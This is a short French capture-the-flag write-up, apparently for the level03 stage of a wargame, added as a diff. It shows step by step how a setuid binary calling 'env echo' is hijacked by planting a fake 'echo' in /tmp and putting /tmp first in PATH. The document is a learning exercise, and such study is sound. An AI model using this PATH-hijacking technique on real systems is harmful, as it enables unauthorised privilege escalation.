@@ -1,0 +1,18 @@
+dans le home de level03 il y a un binaire qui a les droit de flag03 qu'on peut lire et execute
+
+en utilisant la commande:
+strings level03
+
+on trouve cette ligne:
+/usr/bin/env echo Exploit me
+
+un appel de command qui utilise le PATH
+
+on cree un fichier que appel la commande getflag
+echo 'getflag' > /tmp/echo
+chmod +x /tmp/echo
+
+on rajoute en premier dans la variable d'environement PATH le path /tmp
+export PATH="/tmp:${PATH}"
+
+et on appel ./level03 qui va cherche un fichier nome echo dans le PATH qui est /tmp/echo et qui va execute getflag avec les droit de flag03 et affiche le flag
